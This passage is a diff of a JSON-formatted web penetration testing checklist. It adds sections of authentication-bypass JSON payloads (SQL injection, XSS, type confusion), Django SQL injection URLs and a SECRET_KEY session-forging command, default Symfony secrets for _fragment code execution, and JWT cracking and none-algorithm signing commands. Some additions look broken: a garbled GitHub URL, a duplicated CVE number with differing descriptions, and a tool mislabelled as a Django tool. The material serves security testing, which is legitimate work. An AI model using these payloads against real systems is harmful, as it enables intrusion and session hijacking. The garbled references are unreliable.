@@ -433,7 +433,7 @@
             },
             {
               "type": "checklist",
-              "text": "“email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired",
+              "text": "“email” MFA mode allows bypassing MFA from victim's device when the device trust is not expired",
               "checked": false
             },
             {
@@ -577,7 +577,7 @@
             {
               "type": "code",
               "lang": "",
-              "code": "How to hunt :-\n    Try registering any email address without verifying it.\n    Try registering an account again, but this time with a different method, such as ‘sign up with Google’ from same email address.\n    Due to the fact that both email addresses are the same, the web application will link the two accounts.\n    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google."
+              "code": "How to hunt :-\n    Try registering any email address without verifying it.\n    Try registering an account again, but this time with a different method, such as ‘sign up with Google' from same email address.\n    Due to the fact that both email addresses are the same, the web application will link the two accounts.\n    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google."
             },
             {
               "type": "checklist",
@@ -597,7 +597,7 @@
             {
               "type": "code",
               "lang": "",
-              "code": "Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.\n\nOccasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it’s a good idea to pay attention to the response and request portions."
+              "code": "Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.\n\nOccasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it's a good idea to pay attention to the response and request portions."
             },
             {
               "type": "checklist",
@@ -1207,483 +1207,190 @@
           "type": "content",
           "content": [
             {
+              "type": "header",
+              "level": 2,
+              "text": "API Authentication Testing"
+            },
+            {
               "type": "text",
-              "text": "97 JSON Tests for for Authentication Endpoints link pdf [link](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)"
+              "text": "Test various authentication bypass techniques on API endpoints. Replace credentials with these values."
             },
             {
-              "type": "technique",
-              "title": "Basic credentials",
-              "description": ""
+              "type": "checklist",
+              "text": "Empty & Null Payloads",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Empty credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"\", \"password\": \"\"}\n{\"username\": null, \"password\": null}\n{\"username\": \"admin\", \"password\": null}\n{\"username\": null, \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Null values:",
-              "description": ""
+              "type": "checklist",
+              "text": "Type Confusion",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Credentials as numbers:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": 123, \"password\": \"password\"}\n{\"username\": \"admin\", \"password\": 123}\n{\"username\": [], \"password\": []}\n{\"username\": {}, \"password\": {}}"
             },
             {
-              "type": "technique",
-              "title": "Credentials as booleans:",
-              "description": ""
+              "type": "checklist",
+              "text": "SQL Injection Payloads",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Credentials as arrays:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"admin' OR '1'='1\", \"password\": \"password\"}\n{\"username\": \"admin\"--\", \"password\": \"password\"}\n{\"username\": \"' OR 1=1--\", \"password\": \"' OR 1=1--\"}\n{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}"
             },
             {
-              "type": "technique",
-              "title": "Credentials as objects:",
-              "description": ""
+              "type": "checklist",
+              "text": "Special Characters",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Special characters in credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"admin\\\" or \\\"1\\\"=\\\"1\", \"password\": \"password\"}\n{\"username\": \"admin';--\", \"password\": \"password\"}\n{\"username\": \"<script>alert(1)</script>\", \"password\": \"<script>alert(1)</script>\"}"
             },
             {
-              "type": "technique",
-              "title": "SQL Injection:",
-              "description": ""
+              "type": "checklist",
+              "text": "Case Manipulation",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "HTML tags in credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"ADMIN\", \"password\": \"password\"}\n{\"username\": \"Admin\", \"password\": \"password\"}\n{\"username\": \"aDmIn\", \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Unicode in credentials:",
-              "description": ""
+              "type": "checklist",
+              "text": "Unicode / Homograph Attacks",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Credentials with escape characters:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"аdmin\", \"password\": \"password\"}  # Cyrillic 'а'\n{\"username\": \"admin\\u0061\", \"password\": \"password\"}  # Unicode escape"
             },
             {
-              "type": "technique",
-              "title": "Credentials with white space:",
-              "description": ""
+              "type": "checklist",
+              "text": "Array/Object Manipulation",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Overlong values:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": [\"admin\"], \"password\": [\"password\"]}\n{\"username\": {\"user\": \"admin\"}, \"password\": {\"pass\": \"password\"}}\n{\"username\": [[\"admin\"]], \"password\": [[\"password\"]]}"
             },
             {
-              "type": "technique",
-              "title": "Malformed JSON (missing brace):",
-              "description": ""
+              "type": "checklist",
+              "text": "JSON Structure Manipulation",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Malformed JSON (extra comma):",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{}  # Empty object\n{\"username\": \"admin\", \"password\": \"password\", \"\": \"\"}\n{\"username\": \"admin\", \"password\": \"password\", \"extra\": null}\n# Duplicate keys (last value wins in some parsers)\n{\"username\": \"attacker\", \"username\": \"admin\", \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Missing login key:",
-              "description": ""
+              "type": "checklist",
+              "text": "Whitespace / Formatting",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Missing password key:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"   admin   \", \"password\": \"   password   \"}\n{\"username\": \"\\tadmin\\t\", \"password\": \"\\npassword\\n\"}\n{\"username\": \"admin\\u0020\", \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Swapped key values:",
-              "description": ""
+              "type": "checklist",
+              "text": "Boolean/Number Manipulation",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Extra keys:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": true, \"password\": true}\n{\"username\": \"admin\", \"password\": {\"password\": true}}\n{\"username\": 0, \"password\": 0}\n{\"username\": -1, \"password\": -1}"
             },
             {
-              "type": "technique",
-              "title": "Missing colon:",
-              "description": ""
+              "type": "checklist",
+              "text": "Boolean Coercion Bypass",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Invalid Boolean as credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"authenticated\": true, \"role\": \"admin\"}\n{\"isAdmin\": true}\n{\"admin\": true}\n{\"user\": {\"role\": \"admin\"}}"
             },
             {
-              "type": "technique",
-              "title": "All keys, no values:",
-              "description": ""
+              "type": "checklist",
+              "text": "Missing/Extra Fields",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Nested objects:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Only username\n{\"username\": \"admin\"}\n# Extra field that might bypass checks\n{\"username\": \"admin\", \"password\": \"password\", \"_admin\": true}\n# Field name variations\n{\"user\": \"admin\", \"pass\": \"password\"}\n{\"login\": \"admin\", \"secret\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Case sensitivity testing:",
-              "description": ""
+              "type": "checklist",
+              "text": "Overly Long Values",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Login as a number, password as a string:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"A\" * 10000, \"password\": \"A\" * 10000}\n{\"username\": \"\\u0041\" * 10000, \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Login as a string, password as a number:",
-              "description": ""
+              "type": "checklist",
+              "text": "Encoding Variations",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Repeated keys:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Base64 encoded\n{\"username\": \"YWRtaW4=\", \"password\": \"YWRtaW4=\"}  # admin:admin\n# Hex encoded\n{\"username\": \"61646d696e\", \"password\": \"70617373776f7264\"}\n# URL encoded\n{\"username\": \"%61%64%6d%69%6e\", \"password\": \"%70%61%73%73%77%6f%72%64\"}"
             },
             {
-              "type": "technique",
-              "title": "Single quotes instead of double:",
-              "description": ""
+              "type": "checklist",
+              "text": "Regex/Pattern Bypass",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Login and password with only special characters:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Newline injection\n{\"username\": \"admin\\n\", \"password\": \"password\"}\n{\"username\": \"admin\\r\\n\", \"password\": \"password\"}\n# Tab injection\n{\"username\": \"admin\\t\", \"password\": \"password\"}"
             },
             {
-              "type": "technique",
-              "title": "Unicode escape sequence:",
-              "description": ""
+              "type": "checklist",
+              "text": "Parameter Pollution",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Value as object instead of string:",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": "POST /api/login\nContent-Type: application/json\n\nusername=admin&password=password  # Send twice\n{\"username\": [\"admin\", \"admin\"], \"password\": [\"password\", \"password\"]}"
             },
             {
-              "type": "technique",
-              "title": "Nonexistent variables as values:",
-              "description": ""
+              "type": "header",
+              "level": 2,
+              "text": "Tools & References"
             },
             {
-              "type": "technique",
-              "title": "Extra nested objects:",
-              "description": ""
+              "type": "links",
+              "urls": [
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token",
+                "https://github.com/ticarpi/jwt_tool"
+              ]
             },
             {
-              "type": "technique",
-              "title": "Hexadecimal values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Extra symbols after valid JSON:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Only keys, without values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Insertion of control characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Long Unicode Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Newline Characters in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Tab Characters in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with HTML content in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON Injection in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with XML content in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Combination of Number, Strings, and Special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Use of environment variables:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Backslashes in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Long strings of special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Empty Key in JSON:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON Injection in Key:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Quotation marks in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials as nested arrays:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials as nested objects:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Keys as numbers:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Testing with greater than and less than signs:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Testing with parentheses in credentials:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials containing slashes:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials containing multiple data types:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using escape sequences:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using curly braces in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using square brackets in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with only special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with control characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Null characters in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Exponential numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Hexadecimal numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Leading zeros in numeric strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Multilingual input (here, English and Korean):",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Extremely long keys:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Extremely long unicode strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with semicolon:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with backticks:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with plus sign:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with equal sign:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with Asterisk (*) Symbol:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON containing JavaScript code:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Negative numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Values as URLs:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with email format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with IP address format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with date format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with exponential values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with negative exponential values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using Zero Width Space (U+200B) in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using Zero Width Joiner (U+200D) in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with extremely large numbers:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with backspace characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with emoji in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with comments, although they are not officially supported in JSON:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with base64 encoded values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Including null byte character (may cause truncation):",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with credentials in scientific notation:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with octal values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "writeup",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "writeup",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": "# JWT testing\npython3 -m pip install jwt_tool\njwt_tool <token>\n\n# Try to crack JWT secret\njwt_tool <token> -C -d wordlist.txt\n\n# Sign JWT with none algorithm\njwt_tool <token> -A none"
             }
           ]
         }
@@ -2051,7 +1758,7 @@
             {
               "type": "technique",
               "title": "**Authentication flags and privilege escalations at application layer.**",
-              "description": "Applications have their own access control lists (ACLs) and privileges. The most critical aspect of the application related to security is authentication. An authenticated user has access to the internal pages and structures that  reside behind the login section. These privileges can be maintained by the database, LDAP, file etc. If the implementation of authorization is weak, it opens up possible vulnerabilities. If  these vulnerabilities are identified during a test, then there is the potential for exploitation. This exploitation  would likely include accessing another user’s content or becoming a higher-level user with greater permissions  to do greater damage ***How to test for this business logic flaw:***"
+              "description": "Applications have their own access control lists (ACLs) and privileges. The most critical aspect of the application related to security is authentication. An authenticated user has access to the internal pages and structures that  reside behind the login section. These privileges can be maintained by the database, LDAP, file etc. If the implementation of authorization is weak, it opens up possible vulnerabilities. If  these vulnerabilities are identified during a test, then there is the potential for exploitation. This exploitation  would likely include accessing another user's content or becoming a higher-level user with greater permissions  to do greater damage ***How to test for this business logic flaw:***"
             },
             {
               "type": "technique",
@@ -2060,7 +1767,7 @@
             },
             {
               "type": "technique",
-              "title": "**Developer’s cookie tampering and business process/logic bypass.**",
+              "title": "**Developer's cookie tampering and business process/logic bypass.**",
               "description": "Cookies are an essential component to maintain state over HTTP. In many cases, developers are not using session cookies only, but instead are building data internally using session only variables. Application developers set new cookies on the browser at important junctures which exposes logical holes. After authentication logic sets several parameters based on credentials, developers have two options to maintain these credentials  across applications. The developer can set the parameters in session variables or set cookies in the browser with appropriate values. If application developers are passing cookies, then they might be reverse engineered or have values that can be guessed/ deciphered. It can create a possible logical hole or bypass. If an attacker can identify this hole then they can exploit it with ease ***How to test for this business logic flaw:***"
             },
             {
@@ -2071,17 +1778,17 @@
             {
               "type": "technique",
               "title": "**Business Constraint Exploitation**",
-              "description": "The application’s business logic should have defined rules and constraints that are very critical for an application. If these constraints are bypassed by an attacker, then it can be exploited. User fields that have poor design or implementation are often controlled by these business constraints. If business logic is processing variables controlled as hidden values then it leads to easy discovery and exploitation. While crawling and profiling the application, one can list all these possible different values and their injection places. It is easy to browse through these hidden fields and understand their context; if context is leveraged to control the business rules then manipulation of  this information can lead to critical business logic vulnerabilities. ***How to test for this business logic flaw:***"
+              "description": "The application's business logic should have defined rules and constraints that are very critical for an application. If these constraints are bypassed by an attacker, then it can be exploited. User fields that have poor design or implementation are often controlled by these business constraints. If business logic is processing variables controlled as hidden values then it leads to easy discovery and exploitation. While crawling and profiling the application, one can list all these possible different values and their injection places. It is easy to browse through these hidden fields and understand their context; if context is leveraged to control the business rules then manipulation of  this information can lead to critical business logic vulnerabilities. ***How to test for this business logic flaw:***"
             },
             {
               "type": "technique",
               "title": "**Business Flow Bypass**",
-              "description": "Applications include flows that are controlled by redirects and page transfers. After a successful login, for example, the application will transfer the user to the money transfer page.During these transfers, the user’s session is maintained by a session cookie or other mechanism. In many cases, this flow can be bypassed which can lead to an error condition or information leakage. This leakage can help an attacker identify critical back-end information. If this flow is controlling and giving critical information out then it can be exploited in various use cases and scenarios ***How to test for this business logic flaw:***"
+              "description": "Applications include flows that are controlled by redirects and page transfers. After a successful login, for example, the application will transfer the user to the money transfer page.During these transfers, the user's session is maintained by a session cookie or other mechanism. In many cases, this flow can be bypassed which can lead to an error condition or information leakage. This leakage can help an attacker identify critical back-end information. If this flow is controlling and giving critical information out then it can be exploited in various use cases and scenarios ***How to test for this business logic flaw:***"
             },
             {
               "type": "technique",
               "title": "** Identity or Profile Extraction**",
-              "description": "A user’s identity is one of the most critical parameters in authenticated applications. The identities of users  are maintained using session or other forms of tokens. Poorly designed and developed applications allow an attacker to identify these token parameters from the client side and in some cases they are not closely maintained on the server side of the session as well. This scenario opens  up a potential opportunity for abuse and system wide exploitation. The token is either using only a sequential number or a guessable username ***How to test for this business logic flaw:***"
+              "description": "A user's identity is one of the most critical parameters in authenticated applications. The identities of users  are maintained using session or other forms of tokens. Poorly designed and developed applications allow an attacker to identify these token parameters from the client side and in some cases they are not closely maintained on the server side of the session as well. This scenario opens  up a potential opportunity for abuse and system wide exploitation. The token is either using only a sequential number or a guessable username ***How to test for this business logic flaw:***"
             },
             {
               "type": "technique",
@@ -2373,7 +2080,7 @@
             {
               "type": "code",
               "lang": "",
-              "code": "How to inject the code in Cookies?\nThere are many HTTP interceptors and HTTP editors that can intercept the HTTP request before it is sent to the server. Then the tester can introduce his malicious SQL statement in the cookie field.\n\nIt’s like a get/post based SQL Injection, except that certain characters can’t be used. For example, ‘**;**‘ and ‘**,**‘ are typically treated as delimiters, so they end the injection if they aren’t URL-encoded.\n\nCookie : sessionId=xxxbad1fdc’ order by 1# (Normal)_\nCookie : sessionId=xxxbad1fdc’ order by 2# (Error)_\n\nafter error \nsqlmap -u \"\" --cookie=\"\" -p \"\" --dbs"
+              "code": "How to inject the code in Cookies?\nThere are many HTTP interceptors and HTTP editors that can intercept the HTTP request before it is sent to the server. Then the tester can introduce his malicious SQL statement in the cookie field.\n\nIt's like a get/post based SQL Injection, except that certain characters can't be used. For example, ‘**;**‘ and ‘**,**‘ are typically treated as delimiters, so they end the injection if they aren't URL-encoded.\n\nCookie : sessionId=xxxbad1fdc' order by 1# (Normal)_\nCookie : sessionId=xxxbad1fdc' order by 2# (Error)_\n\nafter error \nsqlmap -u \"\" --cookie=\"\" -p \"\" --dbs"
             },
             {
               "type": "checklist",
@@ -2686,24 +2393,217 @@
           "type": "content",
           "content": [
             {
-              "type": "technique",
-              "title": "Rce",
-              "description": ""
+              "type": "header",
+              "level": 2,
+              "text": "Django Security Testing"
             },
             {
-              "type": "technique",
-              "title": "Exposing Django Debug Panel",
-              "description": "` `"
+              "type": "text",
+              "text": "Django is a popular Python web framework. Vulnerabilities often arise from misconfigurations and improper use of ORM features."
             },
             {
-              "type": "technique",
-              "title": "use this wordlist for fuzzing",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "Django Debug Mode Exploitation"
             },
             {
-              "type": "technique",
-              "title": "fuzz with path",
-              "description": ""
+              "type": "text",
+              "text": "When DEBUG=True, Django exposes detailed error pages with stack traces, settings, and environment variables."
+            },
+            {
+              "type": "checklist",
+              "text": "Detect Debug Mode via Error Triggering",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Trigger an error to see debug page\ncurl -H \"Host: invalid-host-header\" http://target.com/\ncurl http://target.com/non-existent-page\ncurl -X POST http://target.com/ --data \"test\""
+            },
+            {
+              "type": "checklist",
+              "text": "Information Disclosed in Debug Mode",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# From debug pages you can find:\n# - Database credentials and type\n# - SECRET_KEY (potential session hijacking)\n# - Environment variables\n# - Internal file paths\n# - Installed packages and versions\n# - Request history"
+            },
+            {
+              "type": "checklist",
+              "text": "Stack Trace Analysis",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Look for:\n# - File paths (e.g., /var/www/myapp/views.py)\n# - Database configuration\n# - Template names\n# - Custom code that may be exploitable"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "CVE-2025-64459 - SQL Injection in QuerySet"
+            },
+            {
+              "type": "text",
+              "text": "Critical SQL injection when user input is passed to filter()/exclude()/get() via dictionary expansion. CVSS 9.1"
+            },
+            {
+              "type": "checklist",
+              "text": "Vulnerable Pattern",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "python",
+              "code": "# VULNERABLE CODE:\ndef search(request):\n    filters = request.GET.dict()  # User controlled\n    results = Model.objects.filter(**filters)  # SQLi!\n\n# OR\ndef search(request):\n    query_params = dict(request.GET.items())\n    q_filter = Q(**query_params)  # SQLi!"
+            },
+            {
+              "type": "checklist",
+              "text": "Exploitation Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Basic authentication bypass\n/endpoint?_connector=OR\n\n# Extract all data\n/endpoint?status=draft&_connector=OR%201=1%20OR\n\n# Blind extraction using time-based\n/endpoint?_connector=OR%20SLEEP(5)%20OR\n\n# With _negated parameter\n/endpoint?_negated=1&_connector=OR"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "CVE-2024-42005 - SQL Injection in values()"
+            },
+            {
+              "type": "text",
+              "text": "SQL injection in Django's QuerySet.values() and values_list() with JSONField."
+            },
+            {
+              "type": "checklist",
+              "text": "Vulnerable Pattern",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "python",
+              "code": "# VULNERABLE CODE:\nclass Event(models.Model):\n    data = models.JSONField()\n\n# When filtering by JSONField keys:\nresults = Event.objects.values('data').filter(data__contains={'key': user_input})"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "CVE-2017-12794 - Debug Page XSS"
+            },
+            {
+              "type": "text",
+              "text": "Django debug page was vulnerable to XSS via exception description."
+            },
+            {
+              "type": "checklist",
+              "text": "Trigger XSS via Error",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Create a duplicate key scenario to trigger error\nPOST /create_user HTTP/1.1\nusername=<script>alert(1)</script>\n# Trigger 500 error with crafted input"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Django Admin Panel Testing"
+            },
+            {
+              "type": "checklist",
+              "text": "Default Admin Paths",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "/admin/\n/admin/login/\n/admin/password_reset/\n/manager/\n/manage/\n/management/"
+            },
+            {
+              "type": "checklist",
+              "text": "Brute Force Paths",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Use wordlist for admin paths\ngobuster dir -u http://target.com -w admin-paths.txt\n\n# Check for exposed Django admin\n/admin/ 200\n/admin/login/?next=/admin/"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Django Sensitive Endpoints"
+            },
+            {
+              "type": "checklist",
+              "text": "Endpoints to Check",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "/__debug__/\n/__debug__/sql_select/\n/admin/jsi18n/\n/django-admin/\n/traceback/\n/technical-500.txt\n/api/v1/\n/api/docs/\n/swagger/\n/redoc/"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Django Session/Auth Vulnerabilities"
+            },
+            {
+              "type": "checklist",
+              "text": "Weak SECRET_KEY Exploitation",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# If SECRET_KEY is known, forge sessions\npython3 -c \"\nfrom django.core.signing import Signer\nsigner = Signer()\nvalue = signer.sign('{\\\"username\\\": \\\"admin\\\", \\\"is_staff\\\": true}')\nprint(value)\n\""
+            },
+            {
+              "type": "checklist",
+              "text": "CSRF Token Bypass",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Check if CSRF is validated\n# Remove CSRF token and see if request succeeds\n# Check for CSRF token in GET requests (should be POST only)\n# Look for missing CSRF tokens on state-changing operations"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "Tools & References"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://github.com/ эпи了一座а/django-admin-scan",
+                "https://github.com/nicholasaleks/Django-AppScanner",
+                "https://github.com/0ang3el/aem-hacker (Django analysis)"
+              ]
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Nuclei templates for Django\nnuclei -u http://target.com -t cves/ -tag django\nnuclei -u http://target.com -t vulnerabilities/ -tag django"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "Django CVEs Reference"
+            },
+            {
+              "type": "checklist",
+              "text": "Recent Critical CVEs",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "CVE-2025-64459 - SQLi in QuerySet.filter() [CVSS 9.1]\nCVE-2024-41905 - SQLi in FilteredRelation\nCVE-2024-41905 - Column alias SQL injection\nCVE-2021-3281 - Arbitrary file read via path traversal"
             }
           ]
         }
@@ -2720,29 +2620,201 @@
           "type": "content",
           "content": [
             {
-              "type": "technique",
-              "title": "Rce",
-              "description": ""
+              "type": "header",
+              "level": 2,
+              "text": "Symfony Security Testing"
             },
             {
-              "type": "technique",
-              "title": "use tool  eos",
-              "description": ""
+              "type": "text",
+              "text": "Symfony is a popular PHP framework. Key vulnerabilities include exposed profiler, weak APP_SECRET, and _fragment RCE."
             },
             {
-              "type": "technique",
-              "title": "path with sensative data disclosure",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "Secret Fragments RCE (Critical)"
             },
             {
-              "type": "technique",
-              "title": "secret fragment exploit",
-              "description": "5-use nuclie template"
+              "type": "text",
+              "text": "If /_fragment is enabled and APP_SECRET is known/default, arbitrary PHP code can be executed."
             },
             {
-              "type": "technique",
-              "title": "fuzz with",
-              "description": ""
+              "type": "checklist",
+              "text": "Discover /_fragment Endpoint",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Check if /_fragment is accessible (should return 403 without signature)\ncurl -I http://target.com/_fragment\n\n# If 200 or doesn't return 403, it might be exploitable"
+            },
+            {
+              "type": "checklist",
+              "text": "Common Default Secrets to Try",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "ThisTokenIsNotSoSecretChangeIt\nThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt\nThisTokenIsNotSoSecretChangeIt1\nThisIsNotASecret\nasecretkey\nchangeme\nff6dc61a329dc96652bb092ec58981f7\nWh4t3v3r\ns$cretf0rt3st\n%secret%\npasteYourSecretKeyHere\nYOUR_APP_SECRET"
+            },
+            {
+              "type": "checklist",
+              "text": "Exploitation with Ambionics Tool",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
